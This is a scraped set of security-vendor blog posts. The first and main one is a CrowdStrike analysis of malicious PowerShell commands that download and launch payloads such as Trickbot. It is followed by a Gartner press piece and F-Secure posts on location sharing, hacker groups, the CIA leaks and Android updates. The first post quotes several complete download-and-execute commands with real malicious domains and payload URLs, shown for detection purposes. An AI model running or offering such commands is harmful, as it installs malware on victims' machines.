<p>First, the PowerShell command has one of the hallmark identifiers of malicious PowerShell execution, &#8220;<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">-windowstyle hidden.</span>&#8221; No doubt countless administrators execute PowerShell with a hidden window, but when we come across these commands, this still catches my attention even if for a brief moment. Typically if the intentions are malicious, the command will also contain &#8220;<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">-executionpolicy bypass</span>&#8220;.</p>
<p>Second, the new webclient object was created to download a single file from a strange domain (subjective) with a benign yet suspicious filename. There are legitimate reasons to use PowerShell to download a file, but in this context it doesn&#8217;t look right. For the example above, <span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">flashplayer.jse</span> from <span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">rivevetoood[.]org</span> is plausible but still strange.</p>
<p>Third, consider the command “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">invoke-item</span>&#8220;. Looking at the real-time and historical data we have available in our Threat Graph, we have not seen any legitimate activity where a system user launches files like this immediately following a download in combination with the other two identifiers above.</p>
<p>When performing analysis, this sort of command is deceptive enough that an analyst might be able to convince themselves it is benign, especially if it is buried in hundreds or thousands of other PowerShell commands in the target environment. However, to the CrowdStrike hunting team, this raises too many red flags to be ignored.</p>
<p>In the course of a day, our analysts spend much of their time looking for anomalies such as the one described above, and then subsequently teasing apart the behaviors involved, then designing Indicator of Attack (IOA) behavioral preventions that expand the protection features of Falcon Host and our customers.</p>
<p>About a month after the analysis of the identified behavior, our analysts started noticing similar examples appearing in our customer environments. An example command that was seen and the command discussed above are compared below:</p>
<p>First Command</p>
<div class=""blog-post-code-wrapper""><span class=""blog-post-code-wrapper"" style=""font-weight: 400;""><br />
&#8220;c:\windows\system32\windowspowershell\v1.0\powershell.exe&#8221; -windowstyle hidden $d=$env:temp+[char][byte]92+&#8217;1478810889388.js&#8217;;(new-object system.net.webclient).downloadfile(&#8216;http&#8217;+&#8217;s://rivevetoood.org/4421148251951/1478810791469497/flashplayer.jse&#8217;,$d);invoke-item $d;<br />
</span></div>
<p>&nbsp;</p>
<p>Second Command</p>
<div class=""blog-post-code-wrapper""><span class=""blog-post-code-wrapper"" style=""font-weight: 400;""><br />
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#8216;http://docsincsconfs.top/xlsoffices.exe&#8217;,&#8217;c:\users\xxxxxx\appdata\roaming.exe&#8217;);start-process &#8216;c:\users\xxxxxx\appdata\roaming.exe&#8217;<br />
</span></div>
<p>&nbsp;</p>
<table style=""height: 201px;"" width=""753"">
<tbody>
<tr>
<td><strong>First Command</strong></td>
<td><strong>Second Command</strong></td>
</tr>
<tr>
<td><span style=""font-weight: 400;"">powershell.exe </span></td>
<td><span style=""font-weight: 400;"">powershell.exe</span></td>
</tr>
<tr>
<td><span style=""font-weight: 400;"">-windowstyle hidden</span></td>
<td><span style=""font-weight: 400;"">-windowstyle hidden</span></td>
</tr>
<tr>
<td><span style=""font-weight: 400;"">new-object system.net.webclient</span></td>
<td><span style=""font-weight: 400;"">new-object system.net.webclient</span></td>
</tr>
<tr>
<td><span style=""font-weight: 400;"">http&#8217;+&#8217;s://rivevetoood.org/</span></td>
<td><span style=""font-weight: 400;"">http://docsincsconfs.top</span></td>
</tr>
<tr>
<td><span style=""font-weight: 400;"">flashplayer.jse</span></td>
<td><span style=""font-weight: 400;"">xlsoffices.exe</span></td>
</tr>
<tr>
<td><span style=""font-weight: 400;"">invoke-item</span></td>
<td><span style=""font-weight: 400;"">start-process</span></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Notice the similarities: use of &#8220;<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">-windowstyle hidden</span>,&#8221; a webclient object created and immediately used to download a file, the suspicious-looking domain name, benign-looking source and target filenames. The execution is slightly different, this time with “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">start-process</span>” instead of “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">invoke-item</span>.&#8221; The more recent command also includes the “-<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">executionpolicy bypass</span>” switch, mentioned earlier as often being an indicator of malicious activity.</p>
<p>We started seeing several of these commands with varying payload URLs, but trying to retrieve the payloads subsequently failed in many cases. At this, our team started becoming more interested in exactly what this malware was.</p>
<p>Our analysts were able to identify 765 total detections on over a million hosts seen using this type of PowerShell command line. However, there were only 66 unique payload URLs, like the following:</p>
<div class=""blog-post-code-wrapper""><span style=""font-weight: 400;""><br />
http://alsawmala[.]com/dolsifcaplomcs.png<br />
http://andrewmckechnie[.]com/wp-content/themes/twentysixteen/docs.php<br />
http://beerbydesign[.]com/13obcphrxa1t3rbmpzh7iy1awhvm1mzntx.exe<br />
http://bizllc[.]org/fcdbyapnue.php<br />
http://celestialfinejewels.com[.]au/typoform/js/foundation/svchost.exe<br />
http://truthforeyoue[.]top/search.php<br />
https://hl3gj7zkxjvo6cra.onion[.]to/svchost.exe<br />
</span></div>
<p>&nbsp;</p>
<p>The CrowdStrike Intelligence team collected some samples and discovered that the PowerShell command is not linked to one particular malware family. For example, some of the links lead to domains that have been associated with known malware such as: Gozi (andrewmckechnie[.]com), Trickbot (alsawmala[.]com), Pony (geosystem.com[.]my) and Cerber ransomware. The results of our detailed analysis highlighted what we believed to be a fairly generic technique used to facilitate the delivery of several malicious campaigns.</p>
<p>We also found that the PowerShell command was sometimes embedded in JavaScript, while other times it was launched after a malicious document was opened. This limits classifying this behavior to a single dropper technique.</p>
<p>While the use of PowerShell techniques have been leveraged by malicious actors and penetration testers for some time, this particular command is unique in its simplicity. Often PowerShell is used to process larger base64 encoded payloads with multiple instructions that actually blend in better with some administrative applications. This one appears to simply hide in plain sight.</p>
<p>Consider a specific example CrowdStrike was able to detonate in a virtual machine with a malicious Word document. The document in question is available on VirusTotal and was submitted in mid-January:<br />
<a href=""https://virustotal.com/en/file/d8d1b79ed336b36be93754031c1b6e2d973b37ef72e1140866e132ba6749535a/analysis/"" target=""_blank"">https://virustotal.com/en/file/d8d1b79ed336b36be93754031c1b6e2d973b37ef72e1140866e132ba6749535a/analysis/</a></p>
<p>I encourage you to perform your own analysis on the technique as well, but of course, please take precautions before downloading and running malware on your network. This example uses a word document with macros enabled. While most environments may have macros disabled by default, we still see this technique occurring across many hosts, as macros are enabled with the click of a button when documents are opened.</p>
<p>The file is a Microsoft word document with a Cyrillic encoding. However, when the document is opened you’re greeted with:</p>
<p><img alt=""office"" class=""aligncenter size-full wp-image-18501"" height=""668"" src=""https://www.crowdstrike.com/blog/wp-content/uploads/2017/02/office.png"" width=""975"" /></p>
<p>If you follow the instructions and enable content, the process will spawn a PowerShell command that fits the behaviors discussed above:</p>
<div class=""blog-post-code-wrapper""><span style=""font-weight: 400;""><br />
PowerShell (New-Object System.Net.WebClient).DownloadFile(&#8216;http://www.sungkrorsang.com/dolsifcaplomcs.png&#8217;,&#8217;C:\Users\XXXXXXXX\AppData\Local\Temp\Sxbyt.exe&#8217;);Start-Process &#8216;C:\Users\XXXXXXXX\AppData\Local\Temp\Sxbyt.exe&#8217;;<br />
</span></div>
<p>&nbsp;</p>
<p>The full process tree, beginning from the document being opened, can be found below:</p>
<p><img alt=""process tree"" class=""aligncenter wp-image-18514"" height=""295"" src=""https://www.crowdstrike.com/blog/wp-content/uploads/2017/02/processtree.png"" width=""800"" />Typically the document would originate as an attachment to an email, or even contained in an archive attached to an email that the user saves to disk, decompresses, and then opens with the Word document contained.</p>
<p>While we could perform static analysis on the Word document, let’s consider what we can see from a behavioral perspective, as this is the sort of information we can glean from exploring events in Falcon data.</p>
<p>Putting aside for a moment how the PowerShell command was spawned (likely a macro embedded in the Word document), we see the child process is trying to retrieve a PNG file from www.sungkrorsang[.]com. The resulting network request, found below, would likely blend into many similar requests for images seen over HTTP on the target network, providing plausible cover for the malicious activity.</p>
<div class=""blog-post-code-wrapper""><span style=""font-weight: 400;""><br />
GET /dolsifcaplomcs.png HTTP/1.1<br />
Host: www.sungkrorsang.com<br />
Connection: Keep-Alive<br />
</span></div>
<p>&nbsp;<br />
However, the malicious payload is written to:<br />
<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">C:\Users\XXXXXX\AppData\Local\Temp\Sxbyt.exe</span></p>
<p>Subsequently, the “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">start-process</span>” PowerShell command launches the newly written executable. The directory “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">AppData\Local\Temp</span>” is used frequently as a destination for malicious files when they are first dropped, given that it provides malware writers with a location from which they can both write and launch files based on the “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">%temp%</span>” or “<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">%appdata%</span>” environment variables set on the host.</p>
<p>The dropped file turns out to be Trickbot in this example with the following hash:<br />
<span class=""blog-post-code-wrapper"" style=""font-weight: 400;"">1401aed41f637e19041da55efa1db71c86fa8bf0a4fdfba057be78eea83c10e6</span></p>
<p>This Trickbot sample is known to VirusTotal:<br />
<a href=""https://virustotal.com/en/file/1401aed41f637e19041da55efa1db71c86fa8bf0a4fdfba057be78eea83c10e6/analysis/"" target=""_blank"">https://virustotal.com/en/file/1401aed41f637e19041da55efa1db71c86fa8bf0a4fdfba057be78eea83c10e6/analysis/</a></p>
<p>From the detonation results, it’s clear in the process tree and network data that at this point, the Trickbot infection takes hold. It’s tempting to call the PowerShell portion of the exploitation the Trickbot dropper. However, we know from the other alerts that this PowerShell technique is used to drop multiple different payloads.</p>
<p>The above analysis provides the CrowdStrike team with enough information to create a behavioral-based IOA prevention for this activity in order to terminate the process before it ever delivers the malicious payload.</p>
<p>CrowdStrike Falcon can offer protection from techniques used like these as seen in this video. If you are a Falcon Host customer, you can leverage the prevention features and ensure coverage for your environment.</p>
<p><center><br />
</center>Falcon Intelligence customers can find more detailed information on these threats in the Intelligence Portal. If you’re not a Falcon Intelligence subscriber, learn more <a href=""https://www.crowdstrike.com/products/falcon-intelligence/intelligence-subscriptions-offerings/"" target=""_blank"">here</a>.</p>
<p>The post <a href=""https://www.crowdstrike.com/blog/blocking-malicious-powershell-downloads/"" rel=""nofollow"">Blocking Malicious PowerShell Downloads</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/blocking-malicious-powershell-downloads/
CrowdStrike Named “Visionary” in Gartner Magic Quadrant,"<p><em>&#8220;Visionaries not only believe that the impossible can be done, but that it must be done.&#8221; — Bran Ferren.  </em></p>
<p>I am thrilled to announce that Gartner has named CrowdStrike a “Visionary” in the <a href=""https://www.crowdstrike.com/resources/reports/gartner-magic-quadrant-positions-crowdstrike-visionary/"" target=""_blank"">2017 Magic Quadrant for Endpoint Protection Platforms (EPP)</a>. This is the first time CrowdStrike has been included in this distinguished report, and we’re honored to receive this recognition in what is perhaps the most influential vendor analysis for organizations evaluating security products and services. In fact, we feel that this is an important validation of our innovation, momentum and success in the industry.  </p>
<p>In our view, being positioned in the “Visionary Quadrant” is exactly where it matters most to forward-thinking organizations like CrowdStrike and our customers. Visionaries align with Gartner&#8217;s view of how a market will evolve. They are companies that invest in leading-edge technologies. Their customers consider them best-of-breed in their categories. They are disruptive agents of change. We think CrowdStrike is a perfect fit.</p>
<p>This year’s Magic Quadrant for EPP evaluated 23 endpoint protection vendors for their “Ability to Execute” as well as their “Completeness of Vision.”  Of those 23 vendors, seven were new entrants, indicating what we believe to be a fundamental shift in endpoint protection —  a shift away from the “old guard” companies that have dominated this category for so many years. It’s important to note that among these new entrants, CrowdStrike was positioned furthest to the right for its Completeness of Vision. Gartner defines Completeness of Vision as the degree to which vendors understand current and future customer requirements, and have a timely roadmap to provide this functionality.  </p>
<p>Visionaries are about the future of endpoint security, and our vision hasn’t changed since the day we founded the company.  That vision was to start with a blank sheet of paper and design the most effective endpoint protection platform possible. It’s what led us to become the first cloud-native endpoint protection solution, providing robust threat prevention leveraging artificial intelligence (AI) and machine learning (ML), advanced detection, response and activity recording, as well as forensics capabilities &#8212; all through a highly intuitive management console.  We are the only company to provide a complete end-to-end solution that unifies next-generation AV with EDR and managed hunting, all via a single lightweight agent. We are also the only tested next-generation endpoint protection solution recognized as capable of fully replacing legacy AV — and a growing number of our customers are doing just that.  Our certifications from <a href=""https://www.crowdstrike.com/wp-content/brochures/avc_mrg_biz_2016_nextgen_en.pdf"" target=""_blank"">AV-Comparatives</a> and <a href=""https://www.crowdstrike.com/resources/news/press-releases/crowdstrikes-machine-learning-engine-becomes-first-signature-less-engine-integrated-virustotal/"" target=""_blank"">SE Labs</a>, combined with Gartner’s recognition of both our Completeness of Vision and our Ability to Execute, attests to our status as true visionaries providing a new, innovative and more effective approach to endpoint protection.</p>
<p>Download a full copy of the <a href=""https://www.crowdstrike.com/resources/reports/gartner-magic-quadrant-positions-crowdstrike-visionary/"" target=""_blank"">Gartner Magic Quadrant for Endpoint Protection Platforms</a>. </p>
<p>Replace your legacy AV with CrowdStrike Falcon today, learn more from <a href=""https://www.crowdstrike.com/resources/crowdcasts/time-come-replace-antivirus-solution/"" target=""_blank""> our webinar on-demand.</a></p>
<p>The post <a href=""https://www.crowdstrike.com/blog/crowdstrike-named-visionary-in-gartner-magic-quadrant/"" rel=""nofollow"">CrowdStrike Named &#8220;Visionary&#8221; in Gartner Magic Quadrant</a> appeared first on <a href=""https://www.crowdstrike.com/blog"" rel=""nofollow""></a>.</p>",https://www.crowdstrike.com/blog/crowdstrike-named-visionary-in-gartner-magic-quadrant/
Real-Time Location Sharing Redux,"<p><a href=""https://blog.google/products/maps/share-your-trips-and-real-time-location-google-maps/"">Google announced</a> on Wednesday that it will soon add real-time location sharing to Google Maps. The feature set appears to be very reminiscent of Google Latitude, which was introduced (way back) in 2009. Location sharing will undoubtedly be a popular option for many, but, it may come with OPSEC considerations for others.</p>
<p>Here&#8217;s what I wrote about Latitude, on <a href=""https://www.f-secure.com/weblog/archives/00001599.html"">February 5, 2009</a>.</p>
<hr />
<p>A new mobile phone application, Google Latitude, was introduced yesterday. It&#8217;s an interesting new addition to Google Maps.</p>
<p>According to Google, with Latitude you can:</p>
<ul>
<li>See where your friends are and what they are up to</li>
<li>Quickly contact them with SMS, IM, or a phone call</li>
<li>Maintain complete control over your privacy</li>
</ul>
<p>Err… Complete control? True, only the friends that you add/allow are able to follow your movements and Latitude does have a manual override function. But complete control? Perhaps it would be more accurate to claim that there are strong controls.</p>
<p>Assuming that you remember to use those controls of course.</p>
<p>If you want to maintain complete control over your privacy, you probably won&#8217;t be installing Latitude.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/03/google-latitude.png""><img alt="""" class=""alignnone size-full wp-image-2507"" height=""396"" src=""https://newsfromthelab.files.wordpress.com/2017/03/google-latitude.png?w=424&#038;h=396"" width=""424"" /></a></p>
<p>On the other hand, if you&#8217;re willing to share some of your personal details, Latitude could prove itself to be a really useful feature.</p>
<p>Updated to add: Reader Daniel S. posted a comment, Google has modified their text to:</p>
<ul>
<li>Control what your location is and who gets to see it</li>
</ul>
<hr />
<p>While Latitude was very popular within a niche, it never achieved mass success and was discontinued in 2013. Google Maps on the other hand is practically everywhere, so, &#8220;Latitude&#8221; is about to be reborn in a big way.</p>
<p>The new sharing features appear to have solid controls; it&#8217;s opt-in, has time limitations, et cetera. But still, if you&#8217;re concerned about leaking your location, be sure to review the settings when you receive the update.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/google/"">Google</a>, <a href=""https://labsblog.f-secure.com/tags/opsec/"">OPSEC</a>, <a href=""https://labsblog.f-secure.com/tags/privacy/"">Privacy</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2508&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/03/23/real-time-location-sharing-redux/
It’s Not New To Us,"<p>A Turkish hacking group <a href=""https://motherboard.vice.com/en_us/article/hackers-we-will-remotely-wipe-iphones-unless-apple-pays-ransom"" target=""_blank"">is reportedly attempting to extort Apple</a> over a compromised cache of iCloud account data.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/03/turkish-crime-family.png""><img alt="""" class=""alignnone wp-image-2499 size-full"" height=""130"" src=""https://newsfromthelab.files.wordpress.com/2017/03/turkish-crime-family.png?w=660&#038;h=130"" style=""border: 1px solid #000000;"" width=""660"" /></a></p>
<p>This activity is on the heels of last week&#8217;s Turkish related <a href=""http://www.theverge.com/2017/3/15/14932490/twitter-hack-turkey-nazi-holland-germany-erdogan"" target=""_blank"">Twitter account hacks</a> via a service called Twitter Counter.</p>
<p>And that brings to mind this article (by Andy)…</p>
<hr />
<p>OVER THE PAST FEW YEARS, you&#8217;ve probably heard phrases such as &#8220;the tactics, techniques, and procedures crafted by highly resourced threat actors are falling into the hands of less skilled adversaries&#8221;. That&#8217;s long speak for &#8220;expect a lot more script kiddies to start pwning your systems&#8221;. As Dr. Ian Levy from GCHQ <a href=""https://www.theregister.co.uk/2017/02/03/security_threat_solutions/"" target=""_blank"">recently pointed out</a>, a lot of the attacks we&#8217;re seeing nowadays aren&#8217;t &#8220;Advanced Persistent Threats&#8221;, they&#8217;re simple hacks performed by &#8220;Adequate Pernicious Toerags&#8221;.</p>
<p>Nothing illustrates this phenomenon better than the group we&#8217;ve dubbed &#8220;The Romanian Underground&#8221;. This is a group that our Cyber Security Services colleagues have had first-hand experience with on a number of occasions while performing incident response and forensics work.</p>
<p>The Romanian Underground are, simply put, a bunch of IRC chatroom buddies who decided it would be cool to take up the hobby of &#8220;hacking&#8221;. Most of these kids, upon joining the collective, have little to no Unix skills to speak of. They probably know about five commands in total. Newcomers are taken under the wing of a mentor who provides them with simple tools and training to get them started on their new hobby. These mentors are almost as unskilled as the newcomers &#8211; they probably know about five more Unix commands than their apprentices. But they&#8217;ve been in the game for a few weeks already, and have a wealth of experience.</p>
<p>As newcomers learn the ropes (which usually implies that they&#8217;ve learned to configure the tools they&#8217;ve been provided), they&#8217;re promoted to mentors, and take on their own set of apprentices. This hierarchical model closely resembles the popular pyramid selling schemes you might have had the misfortune to come across. Of course, the guys involved in The Romanian Underground aren&#8217;t looking to become millionaires by selling soap &#8211; the pyramid scheme is a form of gamification, where the goal is to collect as many owned systems as possible and move up the ranks.<br />
Of course, it&#8217;s the guys at the top of the pyramid who are truly benefitting from all of this. They&#8217;re the ones providing the tools, and by pushing all their manual work downstream, they get access to thousands of compromised systems. Meanwhile, the newcomers are happy to proudly identify themselves as &#8220;hackers&#8221; on their Facebook pages (alongside other random hobbies such as windsurfing or snowboarding).</p>
<p>The toolkits being pushed down the pyramid are usually designed to exploit or brute force common services such as SSH and webmail servers. What might surprise you (or not) is that these toolkits, in the hands of completely unskilled noobs, are being used to compromise even PCI-DSS compliant organizations across the globe.</p>
<p>While this hierarchical method of operations is new to Romania, it&#8217;s not new to us. We&#8217;ve been aware of Turkish website defacement groups such as Akıncılar (who surfaced in 1999 and appear to have still been active in 2016) for quite some time. Those guys also operate under a hierarchy, albeit a more military-style one. In fact, <a href=""https://www.f-secure.com/weblog/archives/00001336.html"">one of our own web sites was defaced</a> by a Turkish group back in 2007. It turns out <a href=""https://www.f-secure.com/weblog/archives/00001337.html"">they abused a vacation notification plugin</a> to perform the attack (pro-tip: plugins will burn you!). Funnily enough, the popularity of our forums actually increased after the attack due to the publicity we received. Go figure.</p>
<p>These structured groups differ from the also rather prevalent &#8220;herd of cats&#8221; approach to hacking collectives such as anon or 4chan, where members scratch and claw their way up the pile only to get pulled back down the next day.</p>
<p>Gamification seems to be a growing trend amongst unskilled hacker groups. In 2016, Turkish hackers set up a <a href=""https://www.bleepingcomputer.com/news/security/turkish-hackers-are-playing-a-ddos-for-points-game/"">DDoS-for-points game</a> designed to be played by noobs. Players were provided with a custom tool designed to carry out DDoS attacks against specific, mostly politically motivated targets. Participants earned points for every 10 minutes&#8217; worth of DDoS achieved. Those points could be redeemed to purchase various clickfraud tools. The grand prize was an &#8220;unlocked&#8221; version of the DDoS tool that allowed its owner to target any site of their choosing.<br />
At the end of the day, we feel that boxes being owned is a lot scarier than website defacements and DDoS attacks, especially when you consider that this is the first time we&#8217;ve encountered it being done on such a large scale, and by script kiddies.</p>
<p>We&#8217;re not surprised that the majority of cyber attacks that happened during 2016, from the San Francisco MUNI to the Dyn outage, were carried out using simple, scriptable techniques against badly maintained infrastructure. The fact that folks with very little skill or know-how can carry out successful attacks against PCI-DSS compliant organizations paints a grim picture of the state of our global computing infrastructure going into 2017.</p>
<hr />
<p>This article was originally published in our <a href=""http://www.f-secure.com/cyber-security-report-2017"">State of Cyber Security 2017</a> report.</p>
<p>A stand-alone version is also available: <a href=""https://newsfromthelab.files.wordpress.com/2017/03/the-romanian-underground-f-secure-state-of-cyber-security-2017.pdf"">The Romanian Underground</a>.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/hackers/"">""Hackers""</a>, <a href=""https://labsblog.f-secure.com/tags/gamification/"">Gamification</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/threat-report/"">Threat Report</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2496&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/03/22/its-not-new-to-us/
FAQ Related To CIA WikiLeaks Docs,"<p>We&#8217;ve been asked numerous questions about WikiLeaks&#8217; March 7th CIA document dump.</p>
<h2>Did the news surprise you?</h2>
<p>No. Spies spy. And that spies use hacking tools… is expected. (&#8220;Q&#8221; does cyber these days.)</p>
<h2>Does this mean that the CIA will have to start over and rebuild a completely new set of tools? Does it need to start from scratch? Is everything &#8220;burned&#8221;?</h2>
<p>The CIA&#8217;s developers would probably need to retool anyway. OS&#8217;s get major updates annually. There&#8217;s always churn, and thus, tools to be rebuilt or created anew. A vulnerability analyst and exploit developer is <em>always</em> busy.</p>
<h2>Do you think the documents are real?</h2>
<p>Yes.</p>
<h2>What are the documents about?</h2>
<p>The documents appear to have come from an internal wiki of some sort. They look like notes written by a developer.</p>
<h2>Where did they come from?</h2>
<p><span class=""st"">A (very plausible) theory we&#8217;ve heard: former Booz Allen Hamilton </span>contractor Harold Martin&#8217;s <span class=""st""><a href=""https://www.nytimes.com/2017/02/08/us/politics/harold-martin-nsa.html"" target=""_blank"">cache of documents</a>.</span></p>
<h2>F-Secure was mentioned in the documents. What do they mean by &#8220;annoying troublemakers&#8221; and &#8220;lower-tier&#8221;?</h2>
<p>Don&#8217;t know, ask them. (Not sure we care.) Sounds cool though.</p>
<div class=""embed-twitter"">
<blockquote class=""twitter-tweet"">
<p dir=""ltr"" lang=""en"">Considering adding a new badge to our product box. <a href=""https://t.co/gOGidSeZ8D"">pic.twitter.com/gOGidSeZ8D</a></p>
<p>&mdash; Mikko Hypponen (@mikko) <a href=""https://twitter.com/mikko/status/839790268010414081"">March 9, 2017</a></p></blockquote>
<p></div>
<h2>How is F-Secure Labs reacting to the alleged &#8220;by-pass&#8221; documented in the leak?</h2>
<p>Very seriously. Investigations began immediately. Notes don&#8217;t equal a good bug report however, so it will take time to be thorough.</p>
<h2>How do you normally handle vulnerabilities?</h2>
<p>Via our own <a href=""https://labsblog.f-secure.com/2017/01/10/f-secure-vulnerability-reward-program-update/"">bug bounty</a> program.</p>
<h2>Will you be paying a bug bounty to the CIA? (Seriously, we&#8217;ve been asked this.)</h2>
<p>No.</p>
<h2>Do you handle vulnerabilities often?</h2>
<p>A fact of life: all software has bugs. End-point protection software is a popular target of university researchers. And that&#8217;s a good thing, bug hunting makes for better software.</p>
<h2>Any other thoughts?</h2>
<p>Cyber security companies are frequently asked if they add backdoors to their products for the benefit of law enforcement and/or nation states. We think these documents conclusively dispel that theory (at least on our part). As you can see, nation state adversaries need to make an effort to bypass our products, just like cyber criminals.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/cia/"">CIA</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/wikileaks/"">WikiLeaks</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2399&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/03/09/faq-related-to-cia-wikileaks-docs/
"Apple, Google, And The CIA","<p>Apple and Google have issued statements to the media regarding WikiLeaks&#8217; March 7th publication of CIA documents.</p>
<p>Here&#8217;s Apple&#8217;s statement via <a href=""https://www.buzzfeed.com/sheerafrenkel/apple-says-they-have-patched-the-vulnerabilities-mentioned-i"" target=""_blank"">BuzzFeed News</a>.</p>
<div class=""wp-caption alignnone"" id=""attachment_2385"" style=""width: 670px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/apple-is-deeply-committed-to-safeguarding-our-customers.png""><img alt=""Apple is deeply committed to safeguarding our customers' privacy and security."" class=""wp-image-2385 size-full"" height=""230"" src=""https://newsfromthelab.files.wordpress.com/2017/03/apple-is-deeply-committed-to-safeguarding-our-customers.png?w=660&#038;h=230"" style=""border: 1px solid #000000;"" width=""660"" /></a><p class=""wp-caption-text"">&#8220;Apple is deeply committed to safeguarding our customers&#8217; privacy and security.&#8221;</p></div>
<p>According to Apple, its &#8220;products and software are designed to quickly get security updates&#8221; to its customers. So, just how well does that statement hold up to what we see in-the-wild? Well, indeed, iOS users update fast.</p>
<p>Based on &#8220;first launch&#8221; telemetry from our <a href=""https://www.f-secure.com/freedome"">Freedome VPN</a>, we consistently observe rapid adoption of the latest version of iOS. In short order, the latest version is the majority of what we see from first-time users.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/03/socs-2017-mobile-os-takeup-rate-ios.png""><img alt=""Mobile OS take up rate - iOS"" class=""alignnone size-full wp-image-2388"" height=""724"" src=""https://newsfromthelab.files.wordpress.com/2017/03/socs-2017-mobile-os-takeup-rate-ios.png?w=1024&#038;h=724"" width=""1024"" /></a></p>
<p>And then… there&#8217;s Google&#8217;s statement, again, via BuzzFeed News.</p>
<div class=""wp-caption alignnone"" id=""attachment_2389"" style=""width: 670px;""><a href=""https://newsfromthelab.files.wordpress.com/2017/03/the-cia-can-also-compromise-smartphones-that-run-googles-android-os.png""><img alt=""The CIA can also compromise smartphones that run Google's Android OS…"" class=""wp-image-2389 size-full"" height=""180"" src=""https://newsfromthelab.files.wordpress.com/2017/03/the-cia-can-also-compromise-smartphones-that-run-googles-android-os.png?w=660&#038;h=180"" style=""border: 1px solid #000000;"" width=""660"" /></a><p class=""wp-caption-text"">&#8220;The CIA can also compromise smartphones that run Google&#8217;s Android…&#8221;</p></div>
<p>Google is &#8220;confident that security updates and protections in […] Android already shield users from many of these alleged vulnerabilities.&#8221; But here&#8217;s the big problem – while the latest version of Android OS might be secure – the version of Android actually installed on the vast majority of phones is not. Not by a long shot.</p>
<p>Based on our Freedome VPN telemetry, we can say that it takes a significant amount of time for Android updates to arrive on customers&#8217; devices.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/03/socs-2017-mobile-os-takeup-rate-android.png""><img alt=""Mobile OS take up rate - Android"" class=""alignnone size-full wp-image-2386"" height=""724"" src=""https://newsfromthelab.files.wordpress.com/2017/03/socs-2017-mobile-os-takeup-rate-android.png?w=1024&#038;h=724"" width=""1024"" /></a></p>
<p>Here&#8217;s a breakdown by a selected set of countries.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2017/03/socs-2017-mobile-os-takeup-rate-freedome-on-android.png""><img alt=""Mobile OS take up rate - Freedome on Android"" class=""alignnone size-full wp-image-2387"" height=""772"" src=""https://newsfromthelab.files.wordpress.com/2017/03/socs-2017-mobile-os-takeup-rate-freedome-on-android.png?w=1024&#038;h=772"" width=""1024"" /></a></p>
<p>The Nordics have a relatively high percentage of Android versions 6 and 7. But the majority of the world? Versions 4 and 5 still dominate.</p>
<p>Bottom line: if you run Android and care at all about your device&#8217;s security… choose your hardware with care. Only a few select vendors are currently focused on providing Google&#8217;s monthly security updates to end users.</p>
<hr />
<p>The graphs in this post were originally published in our <a href=""http://www.f-secure.com/cyber-security-report-2017"">State of Cyber Security 2017</a> report.</p>
<p>A stand-alone version is also available: <a href=""https://newsfromthelab.files.wordpress.com/2017/03/mobile-os-takeup-rate-f-secure-state-of-cyber-security-2017.pdf"">Mobile OS Take Up Rate</a>.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/android/"">Android</a>, <a href=""https://labsblog.f-secure.com/tags/ios/"">iOS</a>, <a href=""https://labsblog.f-secure.com/tags/telemetry/"">Telemetry</a>, <a href=""https://labsblog.f-secure.com/tags/th3-cyb3r/"">Th3 Cyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/threat-report/"">Threat Report</a>, <a href=""https://labsblog.f-secure.com/tags/updates/"">Updates</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2391&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2017/03/09/apple-google-and-the-cia/
